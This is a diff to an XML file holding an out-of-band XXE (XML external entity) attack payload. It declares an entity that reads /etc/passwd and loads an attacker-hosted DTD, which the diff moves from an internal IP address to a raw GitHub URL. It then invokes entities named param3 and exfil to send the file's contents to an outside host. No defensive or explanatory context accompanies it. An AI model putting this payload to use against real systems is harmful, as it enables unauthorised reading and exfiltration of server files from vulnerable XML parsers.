@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE r [
 <!ENTITY % data3 SYSTEM "file:///etc/passwd">
-<!ENTITY % sp SYSTEM "http://10.150.240.16:9090/EII-2653.xml">
+<!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/pishtik/MyRepo/master/EII-2653.xml">
 %sp;
 %param3;
 %exfil;
